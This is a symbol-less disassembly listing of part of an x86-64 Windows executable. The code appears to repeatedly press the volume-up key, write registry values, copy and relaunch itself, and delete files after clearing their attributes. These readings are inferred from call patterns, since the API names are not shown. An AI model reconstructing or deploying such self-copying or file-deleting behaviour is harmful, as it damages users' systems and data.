   140001e38:	c7 45 40 00 00 00 10 	movl   $0x10000000,0x40(%rbp)
   140001e3f:	c7 45 44 02 00 00 00 	movl   $0x2,0x44(%rbp)
   140001e46:	c7 45 48 03 00 00 00 	movl   $0x3,0x48(%rbp)
   140001e4d:	89 75 5c             	mov    %esi,0x5c(%rbp)
   140001e50:	48 89 5d 68          	mov    %rbx,0x68(%rbp)
   140001e54:	48 89 75 38          	mov    %rsi,0x38(%rbp)
   140001e58:	48 89 75 28          	mov    %rsi,0x28(%rbp)
   140001e5c:	48 89 75 30          	mov    %rsi,0x30(%rbp)
   140001e60:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140001e67:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   140001e6e:	07 
   140001e6f:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   140001e76:	00 
   140001e77:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140001e7b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001e80:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001e85:	48 8d 45 38          	lea    0x38(%rbp),%rax
   140001e89:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001e8e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001e93:	45 33 c9             	xor    %r9d,%r9d
   140001e96:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e9b:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001ea1:	ff 15 71 31 00 00    	call   *0x3171(%rip)        # 0x140005018
   140001ea7:	85 c0                	test   %eax,%eax
   140001ea9:	0f 85 2b 02 00 00    	jne    0x1400020da
   140001eaf:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   140001eb3:	4c 8b 45 38          	mov    0x38(%rbp),%r8
   140001eb7:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   140001ebb:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001ec0:	ff 15 6a 31 00 00    	call   *0x316a(%rip)        # 0x140005030
   140001ec6:	85 c0                	test   %eax,%eax
   140001ec8:	74 18                	je     0x140001ee2
   140001eca:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140001ece:	48 85 c9             	test   %rcx,%rcx
   140001ed1:	0f 84 03 02 00 00    	je     0x1400020da
   140001ed7:	ff 15 db 31 00 00    	call   *0x31db(%rip)        # 0x1400050b8
   140001edd:	e9 f8 01 00 00       	jmp    0x1400020da
   140001ee2:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140001ee9:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   140001ef0:	07 
   140001ef1:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   140001ef8:	00 
   140001ef9:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001efe:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140001f02:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001f07:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001f0c:	45 33 c9             	xor    %r9d,%r9d
   140001f0f:	ba 01 00 00 00       	mov    $0x1,%edx
   140001f14:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001f1a:	ff 15 00 31 00 00    	call   *0x3100(%rip)        # 0x140005020
   140001f20:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140001f24:	48 85 c9             	test   %rcx,%rcx
   140001f27:	74 06                	je     0x140001f2f
   140001f29:	ff 15 89 31 00 00    	call   *0x3189(%rip)        # 0x1400050b8
   140001f2f:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140001f33:	48 85 c9             	test   %rcx,%rcx
   140001f36:	74 06                	je     0x140001f3e
   140001f38:	ff 15 7a 31 00 00    	call   *0x317a(%rip)        # 0x1400050b8
   140001f3e:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140001f45:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   140001f4c:	07 
   140001f4d:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   140001f54:	00 
   140001f55:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001f5a:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140001f5f:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001f64:	4c 8b cb             	mov    %rbx,%r9
   140001f67:	ba 01 00 00 00       	mov    $0x1,%edx
   140001f6c:	44 8b c2             	mov    %edx,%r8d
   140001f6f:	ff 15 ab 30 00 00    	call   *0x30ab(%rip)        # 0x140005020
   140001f75:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001f78:	33 c0                	xor    %eax,%eax
   140001f7a:	0f 11 45 70          	movups %xmm0,0x70(%rbp)
   140001f7e:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   140001f85:	48 8d 15 74 37 00 00 	lea    0x3774(%rip),%rdx        # 0x140005700
   140001f8c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001f91:	e8 3a 06 00 00       	call   0x1400025d0
   140001f96:	90                   	nop
   140001f97:	48 8d 15 a2 37 00 00 	lea    0x37a2(%rip),%rdx        # 0x140005740
   140001f9e:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001fa3:	e8 28 06 00 00       	call   0x1400025d0
   140001fa8:	90                   	nop
   140001fa9:	48 8d 15 d0 37 00 00 	lea    0x37d0(%rip),%rdx        # 0x140005780
   140001fb0:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   140001fb4:	e8 17 06 00 00       	call   0x1400025d0
   140001fb9:	90                   	nop
   140001fba:	48 8d 15 0f 38 00 00 	lea    0x380f(%rip),%rdx        # 0x1400057d0
   140001fc1:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140001fc5:	e8 06 06 00 00       	call   0x1400025d0
   140001fca:	90                   	nop
   140001fcb:	48 8d 15 4e 38 00 00 	lea    0x384e(%rip),%rdx        # 0x140005820
   140001fd2:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001fd6:	e8 f5 05 00 00       	call   0x1400025d0
   140001fdb:	90                   	nop
   140001fdc:	48 8d 15 8d 38 00 00 	lea    0x388d(%rip),%rdx        # 0x140005870
   140001fe3:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001fe7:	e8 e4 05 00 00       	call   0x1400025d0
   140001fec:	90                   	nop
   140001fed:	48 8d 15 bc 38 00 00 	lea    0x38bc(%rip),%rdx        # 0x1400058b0
   140001ff4:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140001ff8:	e8 d3 05 00 00       	call   0x1400025d0
   140001ffd:	90                   	nop
   140001ffe:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002001:	f3 0f 7f 45 70       	movdqu %xmm0,0x70(%rbp)
   140002006:	48 89 b5 80 00 00 00 	mov    %rsi,0x80(%rbp)
   14000200d:	b9 e0 00 00 00       	mov    $0xe0,%ecx
   140002012:	e8 11 0d 00 00       	call   0x140002d28
   140002017:	48 89 45 70          	mov    %rax,0x70(%rbp)
   14000201b:	48 89 45 78          	mov    %rax,0x78(%rbp)
   14000201f:	48 8d 88 e0 00 00 00 	lea    0xe0(%rax),%rcx
   140002026:	48 89 8d 80 00 00 00 	mov    %rcx,0x80(%rbp)
   14000202d:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140002031:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   140002035:	4c 8d 4d 70          	lea    0x70(%rbp),%r9
   140002039:	4c 8b c0             	mov    %rax,%r8
   14000203c:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140002040:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002045:	e8 96 08 00 00       	call   0x1400028e0
   14000204a:	48 89 45 78          	mov    %rax,0x78(%rbp)
   14000204e:	4c 8d 0d fb 04 00 00 	lea    0x4fb(%rip),%r9        # 0x140002550
   140002055:	ba 20 00 00 00       	mov    $0x20,%edx
   14000205a:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140002060:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002065:	e8 fa 0c 00 00       	call   0x140002d64
   14000206a:	48 8b 5d 70          	mov    0x70(%rbp),%rbx
   14000206e:	48 8b 7d 78          	mov    0x78(%rbp),%rdi
   140002072:	48 3b df             	cmp    %rdi,%rbx
   140002075:	74 59                	je     0x1400020d0
   140002077:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000207e:	00 00 
   140002080:	48 8b cb             	mov    %rbx,%rcx
   140002083:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140002088:	76 03                	jbe    0x14000208d
   14000208a:	48 8b 0b             	mov    (%rbx),%rcx
   14000208d:	ff 15 75 30 00 00    	call   *0x3075(%rip)        # 0x140005108
   140002093:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002096:	74 1c                	je     0x1400020b4
   140002098:	a8 01                	test   $0x1,%al
   14000209a:	74 18                	je     0x1400020b4
   14000209c:	48 8b cb             	mov    %rbx,%rcx
   14000209f:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   1400020a4:	76 03                	jbe    0x1400020a9
   1400020a6:	48 8b 0b             	mov    (%rbx),%rcx
   1400020a9:	83 e0 fe             	and    $0xfffffffe,%eax
   1400020ac:	8b d0                	mov    %eax,%edx
   1400020ae:	ff 15 3c 30 00 00    	call   *0x303c(%rip)        # 0x1400050f0
   1400020b4:	48 8b cb             	mov    %rbx,%rcx
   1400020b7:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   1400020bc:	76 03                	jbe    0x1400020c1
   1400020be:	48 8b 0b             	mov    (%rbx),%rcx
   1400020c1:	ff 15 19 30 00 00    	call   *0x3019(%rip)        # 0x1400050e0
   1400020c7:	48 83 c3 20          	add    $0x20,%rbx
   1400020cb:	48 3b df             	cmp    %rdi,%rbx
   1400020ce:	75 b0                	jne    0x140002080
   1400020d0:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   1400020d4:	e8 87 07 00 00       	call   0x140002860
   1400020d9:	90                   	nop
   1400020da:	48 8b 95 a8 00 00 00 	mov    0xa8(%rbp),%rdx
   1400020e1:	48 83 fa 07          	cmp    $0x7,%rdx
   1400020e5:	76 4b                	jbe    0x140002132
   1400020e7:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400020ee:	00 
   1400020ef:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   1400020f6:	48 8b c1             	mov    %rcx,%rax
   1400020f9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002100:	72 2b                	jb     0x14000212d
   140002102:	48 83 c2 27          	add    $0x27,%rdx
   140002106:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000210a:	48 2b c1             	sub    %rcx,%rax
   14000210d:	48 83 e8 08          	sub    $0x8,%rax
   140002111:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002115:	76 16                	jbe    0x14000212d
   140002117:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000211c:	45 33 c9             	xor    %r9d,%r9d
   14000211f:	45 33 c0             	xor    %r8d,%r8d
   140002122:	33 d2                	xor    %edx,%edx
   140002124:	33 c9                	xor    %ecx,%ecx
   140002126:	ff 15 04 32 00 00    	call   *0x3204(%rip)        # 0x140005330
   14000212c:	cc                   	int3
   14000212d:	e8 ee 0b 00 00       	call   0x140002d20
   140002132:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   140002139:	48 33 cc             	xor    %rsp,%rcx
   14000213c:	e8 bf 0b 00 00       	call   0x140002d00
   140002141:	4c 8d 9c 24 c0 02 00 	lea    0x2c0(%rsp),%r11
   140002148:	00 
   140002149:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000214d:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140002151:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140002155:	49 8b e3             	mov    %r11,%rsp
   140002158:	5d                   	pop    %rbp
   140002159:	c3                   	ret
   14000215a:	cc                   	int3
   14000215b:	cc                   	int3
   14000215c:	cc                   	int3
   14000215d:	cc                   	int3
   14000215e:	cc                   	int3
   14000215f:	cc                   	int3
   140002160:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002165:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000216a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000216f:	55                   	push   %rbp
   140002170:	41 56                	push   %r14
   140002172:	41 57                	push   %r15
   140002174:	48 8d ac 24 40 f7 ff 	lea    -0x8c0(%rsp),%rbp
   14000217b:	ff 
   14000217c:	48 81 ec c0 09 00 00 	sub    $0x9c0,%rsp
   140002183:	48 8b 05 b6 5e 00 00 	mov    0x5eb6(%rip),%rax        # 0x140008040
   14000218a:	48 33 c4             	xor    %rsp,%rax
   14000218d:	48 89 85 b0 08 00 00 	mov    %rax,0x8b0(%rbp)
   140002194:	48 8b d9             	mov    %rcx,%rbx
   140002197:	33 c9                	xor    %ecx,%ecx
   140002199:	ff 15 c9 31 00 00    	call   *0x31c9(%rip)        # 0x140005368
   14000219f:	8b c8                	mov    %eax,%ecx
   1400021a1:	ff 15 d1 31 00 00    	call   *0x31d1(%rip)        # 0x140005378
   1400021a7:	8b 05 c7 37 00 00    	mov    0x37c7(%rip),%eax        # 0x140005974
   1400021ad:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400021b1:	89 45 68             	mov    %eax,0x68(%rbp)
   1400021b4:	45 33 f6             	xor    %r14d,%r14d
   1400021b7:	0f b7 05 ba 37 00 00 	movzwl 0x37ba(%rip),%eax        # 0x140005978
   1400021be:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400021c1:	66 89 45 6c          	mov    %ax,0x6c(%rbp)
   1400021c5:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400021c8:	48 8d 05 71 f1 ff ff 	lea    -0xe8f(%rip),%rax        # 0x140001340
   1400021cf:	4c 89 75 e0          	mov    %r14,-0x20(%rbp)
   1400021d3:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400021d7:	48 8d 45 68          	lea    0x68(%rbp),%rax
   1400021db:	48 89 45 20          	mov    %rax,0x20(%rbp)
   1400021df:	4c 89 75 f0          	mov    %r14,-0x10(%rbp)
   1400021e3:	66 0f 7f 45 00       	movdqa %xmm0,0x0(%rbp)
   1400021e8:	66 0f 7f 4d 10       	movdqa %xmm1,0x10(%rbp)
   1400021ed:	48 89 5d f8          	mov    %rbx,-0x8(%rbp)
   1400021f1:	ff 15 01 30 00 00    	call   *0x3001(%rip)        # 0x1400051f8
   1400021f7:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1400021fc:	4c 8d 05 7d 37 00 00 	lea    0x377d(%rip),%r8        # 0x140005980
   140002203:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002208:	48 8d 55 68          	lea    0x68(%rbp),%rdx
   14000220c:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140002211:	45 33 c9             	xor    %r9d,%r9d
   140002214:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   140002219:	33 c9                	xor    %ecx,%ecx
   14000221b:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140002222:	80 
   140002223:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   14000222a:	80 
   14000222b:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140002232:	80 
   140002233:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   14000223a:	80 
   14000223b:	ff 15 87 2f 00 00    	call   *0x2f87(%rip)        # 0x1400051c8
   140002241:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   140002247:	45 33 c0             	xor    %r8d,%r8d
   14000224a:	48 8b c8             	mov    %rax,%rcx
   14000224d:	ba 01 00 00 00       	mov    $0x1,%edx
   140002252:	48 8b f8             	mov    %rax,%rdi
   140002255:	ff 15 95 2f 00 00    	call   *0x2f95(%rip)        # 0x1400051f0
   14000225b:	bb 32 00 00 00       	mov    $0x32,%ebx
   140002260:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   140002267:	ff ff 7f 
   14000226a:	49 bf 7f 0f 05 fd ff 	movabs $0x7ffffffffd050f7f,%r15
   140002271:	ff ff 7f 
   140002274:	0f 1f 40 00          	nopl   0x0(%rax)
   140002278:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000227f:	00 
   140002280:	45 33 c9             	xor    %r9d,%r9d
   140002283:	45 33 c0             	xor    %r8d,%r8d
   140002286:	33 d2                	xor    %edx,%edx
   140002288:	b1 af                	mov    $0xaf,%cl
   14000228a:	ff 15 30 2f 00 00    	call   *0x2f30(%rip)        # 0x1400051c0
   140002290:	45 33 c9             	xor    %r9d,%r9d
   140002293:	33 d2                	xor    %edx,%edx
   140002295:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000229b:	b1 af                	mov    $0xaf,%cl
   14000229d:	ff 15 1d 2f 00 00    	call   *0x2f1d(%rip)        # 0x1400051c0
   1400022a3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400022a8:	e8 73 ed ff ff       	call   0x140001020
   1400022ad:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1400022b2:	49 3b c7             	cmp    %r15,%rax
   1400022b5:	7d 0c                	jge    0x1400022c3
   1400022b7:	48 05 80 f0 fa 02    	add    $0x2faf080,%rax
   1400022bd:	48 89 45 30          	mov    %rax,0x30(%rbp)
   1400022c1:	eb 04                	jmp    0x1400022c7
   1400022c3:	48 89 75 30          	mov    %rsi,0x30(%rbp)
   1400022c7:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   1400022cb:	e8 50 04 00 00       	call   0x140002720
   1400022d0:	48 83 eb 01          	sub    $0x1,%rbx
   1400022d4:	75 aa                	jne    0x140002280
   1400022d6:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   1400022db:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400022e0:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400022e5:	48 8d 15 44 33 00 00 	lea    0x3344(%rip),%rdx        # 0x140005630
   1400022ec:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400022f1:	45 33 c9             	xor    %r9d,%r9d
   1400022f4:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   1400022fb:	00 
   1400022fc:	45 33 c0             	xor    %r8d,%r8d
   1400022ff:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140002306:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   14000230b:	c7 45 30 01 00 00 00 	movl   $0x1,0x30(%rbp)
   140002312:	ff 15 10 2d 00 00    	call   *0x2d10(%rip)        # 0x140005028
   140002318:	85 c0                	test   %eax,%eax
   14000231a:	75 66                	jne    0x140002382
   14000231c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002321:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140002325:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   14000232c:	00 
   14000232d:	48 8d 15 74 33 00 00 	lea    0x3374(%rip),%rdx        # 0x1400056a8
   140002334:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000233a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000233f:	45 33 c0             	xor    %r8d,%r8d
   140002342:	ff 15 c8 2c 00 00    	call   *0x2cc8(%rip)        # 0x140005010
   140002348:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000234d:	ff 15 e5 2c 00 00    	call   *0x2ce5(%rip)        # 0x140005038
   140002353:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002358:	4c 8d 0d 69 33 00 00 	lea    0x3369(%rip),%r9        # 0x1400056c8
   14000235f:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140002366:	00 
   140002367:	45 33 c0             	xor    %r8d,%r8d
   14000236a:	ba 1a 00 00 00       	mov    $0x1a,%edx
   14000236f:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140002376:	00 
   140002377:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   14000237c:	ff 15 56 2e 00 00    	call   *0x2e56(%rip)        # 0x1400051d8
   140002382:	ba 04 01 00 00       	mov    $0x104,%edx
   140002387:	48 8d 8d 90 04 00 00 	lea    0x490(%rbp),%rcx
   14000238e:	ff 15 64 2d 00 00    	call   *0x2d64(%rip)        # 0x1400050f8
   140002394:	85 c0                	test   %eax,%eax
   140002396:	0f 84 02 01 00 00    	je     0x14000249e
   14000239c:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400023a2:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   1400023a6:	33 c9                	xor    %ecx,%ecx
   1400023a8:	ff 15 62 2d 00 00    	call   *0x2d62(%rip)        # 0x140005110
   1400023ae:	85 c0                	test   %eax,%eax
   1400023b0:	0f 84 e8 00 00 00    	je     0x14000249e
   1400023b6:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   1400023ba:	48 8d 8d 80 02 00 00 	lea    0x280(%rbp),%rcx
   1400023c1:	ff 15 91 2c 00 00    	call   *0x2c91(%rip)        # 0x140005058
   1400023c7:	48 8d 8d 80 02 00 00 	lea    0x280(%rbp),%rcx
   1400023ce:	ff 15 b4 2d 00 00    	call   *0x2db4(%rip)        # 0x140005188
   1400023d4:	48 8d 95 90 04 00 00 	lea    0x490(%rbp),%rdx
   1400023db:	48 8d 8d 80 02 00 00 	lea    0x280(%rbp),%rcx
   1400023e2:	ff 15 70 2f 00 00    	call   *0x2f70(%rip)        # 0x140005358
   1400023e8:	85 c0                	test   %eax,%eax
   1400023ea:	0f 84 ae 00 00 00    	je     0x14000249e
   1400023f0:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   1400023f4:	ff 15 9e 2d 00 00    	call   *0x2d9e(%rip)        # 0x140005198
   1400023fa:	4c 8b c0             	mov    %rax,%r8
   1400023fd:	48 8d 95 90 04 00 00 	lea    0x490(%rbp),%rdx
   140002404:	48 8d 8d a0 06 00 00 	lea    0x6a0(%rbp),%rcx
   14000240b:	ff 15 7f 2d 00 00    	call   *0x2d7f(%rip)        # 0x140005190
   140002411:	45 33 c0             	xor    %r8d,%r8d
   140002414:	48 8d 95 a0 06 00 00 	lea    0x6a0(%rbp),%rdx
   14000241b:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   14000241f:	ff 15 2b 2c 00 00    	call   *0x2c2b(%rip)        # 0x140005050
   140002425:	85 c0                	test   %eax,%eax
   140002427:	75 0b                	jne    0x140002434
   140002429:	ff 15 b9 2c 00 00    	call   *0x2cb9(%rip)        # 0x1400050e8
   14000242f:	83 f8 20             	cmp    $0x20,%eax
   140002432:	75 6a                	jne    0x14000249e
   140002434:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002437:	c7 44 24 70 70 00 00 	movl   $0x70,0x70(%rsp)
   14000243e:	00 
   14000243f:	33 c0                	xor    %eax,%eax
   140002441:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002446:	48 89 45 d4          	mov    %rax,-0x2c(%rbp)
   14000244a:	89 45 dc             	mov    %eax,-0x24(%rbp)
   14000244d:	48 8d 05 04 31 00 00 	lea    0x3104(%rip),%rax        # 0x140005558
   140002454:	0f 11 44 24 74       	movups %xmm0,0x74(%rsp)
   140002459:	c7 44 24 74 40 00 00 	movl   $0x40,0x74(%rsp)
   140002460:	00 
   140002461:	0f 11 45 84          	movups %xmm0,-0x7c(%rbp)
   140002465:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140002469:	48 8d 85 a0 06 00 00 	lea    0x6a0(%rbp),%rax
   140002470:	0f 11 45 94          	movups %xmm0,-0x6c(%rbp)
   140002474:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   140002478:	0f 11 45 a4          	movups %xmm0,-0x5c(%rbp)
   14000247c:	c7 45 a0 01 00 00 00 	movl   $0x1,-0x60(%rbp)
   140002483:	0f 11 45 b4          	movups %xmm0,-0x4c(%rbp)
   140002487:	0f 11 45 c4          	movups %xmm0,-0x3c(%rbp)
   14000248b:	ff 15 e7 2c 00 00    	call   *0x2ce7(%rip)        # 0x140005178
   140002491:	85 c0                	test   %eax,%eax
   140002493:	74 09                	je     0x14000249e
   140002495:	33 c9                	xor    %ecx,%ecx
   140002497:	ff 15 ab 2b 00 00    	call   *0x2bab(%rip)        # 0x140005048
   14000249d:	cc                   	int3
   14000249e:	e8 dd ee ff ff       	call   0x140001380
   1400024a3:	e8 c8 f8 ff ff       	call   0x140001d70
   1400024a8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400024ab:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   1400024af:	45 33 c9             	xor    %r9d,%r9d
   1400024b2:	45 33 c0             	xor    %r8d,%r8d
   1400024b5:	33 d2                	xor    %edx,%edx
   1400024b7:	0f 11 45 38          	movups %xmm0,0x38(%rbp)
   1400024bb:	0f 11 45 48          	movups %xmm0,0x48(%rbp)
   1400024bf:	0f 11 45 58          	movups %xmm0,0x58(%rbp)
   1400024c3:	ff 15 ef 2c 00 00    	call   *0x2cef(%rip)        # 0x1400051b8
   1400024c9:	85 c0                	test   %eax,%eax
   1400024cb:	74 36                	je     0x140002503
   1400024cd:	0f 1f 00             	nopl   (%rax)
   1400024d0:	44 38 35 dd 5b 00 00 	cmp    %r14b,0x5bdd(%rip)        # 0x1400080b4
   1400024d7:	74 2a                	je     0x140002503
   1400024d9:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   1400024dd:	ff 15 05 2d 00 00    	call   *0x2d05(%rip)        # 0x1400051e8
   1400024e3:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   1400024e7:	ff 15 e3 2c 00 00    	call   *0x2ce3(%rip)        # 0x1400051d0
   1400024ed:	45 33 c9             	xor    %r9d,%r9d
   1400024f0:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   1400024f4:	45 33 c0             	xor    %r8d,%r8d
   1400024f7:	33 d2                	xor    %edx,%edx
   1400024f9:	ff 15 b9 2c 00 00    	call   *0x2cb9(%rip)        # 0x1400051b8
   1400024ff:	85 c0                	test   %eax,%eax
   140002501:	75 cd                	jne    0x1400024d0
   140002503:	ba 01 00 00 00       	mov    $0x1,%edx
   140002508:	48 8b cf             	mov    %rdi,%rcx
   14000250b:	ff 15 97 2c 00 00    	call   *0x2c97(%rip)        # 0x1400051a8
   140002511:	33 c0                	xor    %eax,%eax
   140002513:	48 8b 8d b0 08 00 00 	mov    0x8b0(%rbp),%rcx
   14000251a:	48 33 cc             	xor    %rsp,%rcx
   14000251d:	e8 de 07 00 00       	call   0x140002d00
   140002522:	4c 8d 9c 24 c0 09 00 	lea    0x9c0(%rsp),%r11
   140002529:	00 
   14000252a:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000252e:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140002532:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140002536:	49 8b e3             	mov    %r11,%rsp
   140002539:	41 5f                	pop    %r15
   14000253b:	41 5e                	pop    %r14
   14000253d:	5d                   	pop    %rbp
   14000253e:	c3                   	ret
   14000253f:	cc                   	int3
   140002540:	e9 1b 03 00 00       	jmp    0x140002860
   140002545:	cc                   	int3
   140002546:	cc                   	int3
   140002547:	cc                   	int3
   140002548:	cc                   	int3
   140002549:	cc                   	int3
   14000254a:	cc                   	int3
   14000254b:	cc                   	int3
   14000254c:	cc                   	int3
   14000254d:	cc                   	int3
   14000254e:	cc                   	int3
   14000254f:	cc                   	int3
   140002550:	40 53                	rex push %rbx
   140002552:	48 83 ec 30          	sub    $0x30,%rsp
   140002556:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   14000255a:	48 8b d9             	mov    %rcx,%rbx
   14000255d:	48 83 fa 07          	cmp    $0x7,%rdx
   140002561:	76 31                	jbe    0x140002594
   140002563:	48 8b 09             	mov    (%rcx),%rcx
   140002566:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000256d:	00 
   14000256e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002575:	72 18                	jb     0x14000258f
   140002577:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   14000257b:	48 83 c2 27          	add    $0x27,%rdx
   14000257f:	48 2b c8             	sub    %rax,%rcx
   140002582:	48 83 e9 08          	sub    $0x8,%rcx
   140002586:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000258a:	77 1f                	ja     0x1400025ab
   14000258c:	48 8b c8             	mov    %rax,%rcx
   14000258f:	e8 8c 07 00 00       	call   0x140002d20
   140002594:	33 c0                	xor    %eax,%eax
   140002596:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   14000259d:	00 
   14000259e:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400025a2:	66 89 03             	mov    %ax,(%rbx)
   1400025a5:	48 83 c4 30          	add    $0x30,%rsp
   1400025a9:	5b                   	pop    %rbx
   1400025aa:	c3                   	ret
   1400025ab:	33 c0                	xor    %eax,%eax
   1400025ad:	45 33 c9             	xor    %r9d,%r9d
   1400025b0:	45 33 c0             	xor    %r8d,%r8d
   1400025b3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400025b8:	33 d2                	xor    %edx,%edx
   1400025ba:	33 c9                	xor    %ecx,%ecx
